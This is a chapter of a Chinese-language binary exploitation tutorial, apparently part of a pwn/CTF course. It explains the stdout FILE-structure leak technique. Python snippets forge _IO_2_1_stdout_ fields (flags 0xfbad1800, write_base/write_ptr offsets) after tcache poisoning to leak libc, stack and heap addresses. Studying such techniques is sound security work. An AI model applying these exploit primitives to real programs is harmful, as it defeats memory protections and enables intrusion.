# 第 13 章 stdout 泄露的多种姿势

> 伪造 `_IO_2_1_stdout_` 的 write_base/write_ptr，让程序把任意地址的内存打印出来——这是现代堆利用中最常用的信息泄露手段。

---

## 13.1 原理回顾

`puts` 输出数据时，最终会调用 `_IO_new_file_xsputn`，它根据：

```c
to_do = write_ptr - write_base;
write(fileno, write_base, to_do);
```

如果控制 stdout 的 `_IO_write_base` 和 `_IO_write_ptr`，就能输出任意地址的内存。

### 13.1.1 触发条件

伪造的 stdout 必须满足：

```c
_flags & _IO_NO_WRITES == 0
_flags & _IO_CURRENTLY_PUTTING != 0
```

常用 flags：`0xfbad1800`（_IO_MAGIC | _IO_CURRENTLY_PUTTING | _IO_LINE_BUF）。

---

## 13.2 泄露 libc

```python
# 伪造 stdout，让 write_base 指向 GOT 表
fake_stdout = flat({
    0x00: 0xfbad1800,
    0x18: elf.got['puts'],           # _IO_read_base（有时用这个）
    0x20: elf.got['puts'],           # _IO_write_base = 要泄露的地址
    0x28: elf.got['puts'] + 8,       # _IO_write_ptr = +8
    0x38: elf.got['puts'],           # _IO_buf_base
    0x40: elf.got['puts'] + 8,       # _IO_buf_end
})

# 通过 tcache poisoning 把 fake_stdout 写到 _IO_2_1_stdout_
# 程序下次 puts 时，输出 puts@got 的内容 → libc 地址
```

---

## 13.3 泄露栈地址

`environ` 全局变量指向环境变量数组，在栈上。泄露 `environ` 的值就得到栈地址：

```python
environ_addr = libc.sym['environ']
# 伪造 stdout 让 write_base = environ_addr，write_ptr = environ_addr + 8
# 输出 environ 的值 → 栈地址
```

---

## 13.4 泄露堆地址

类似方法，泄露 tcache 结构或 chunk 指针。

---

## 13.5 一次性泄露大量数据

把 write_base 设为目标地址，write_ptr 设为目标地址 + N，可以一次输出 N 字节：

```python
fake_stdout = flat({
    0x00: 0xfbad1800,
    0x20: target_addr,
    0x28: target_addr + 0x100,    # 输出 0x100 字节
    ...
})
```

---

## 13.6 常见坑

1. **偏移错误**：write_base 在 0x20，write_ptr 在 0x28。有些版本用 read_base/read_end，需要根据实际 libc 调整。
2. **输出缓冲**：如果程序设置了全缓冲，输出可能不会立即刷新。用 `setvbuf` 关闭缓冲。
3. **flags 检查**：flags 不对时，puts 可能不输出任何东西。

---

## 13.7 小结

这一章我们学习了 stdout 泄露：

- 伪造 `_IO_2_1_stdout_` 的 write_base/write_ptr
- 泄露 GOT → libc 地址
- 泄露 environ → 栈地址
- 泄露 tcache → 堆地址
- flags 必须设置为 `0xfbad1800` 之类

第三篇 · IO_FILE 深度剖析至此完结。接下来是第四篇——自动化与工具。

---

**第三篇完 · 下一站**：[第四篇 · 自动化与工具](../04-automation/README.md) → [第 14 章 angr 符号执行入门](../04-automation/ch14-angr入门.md)
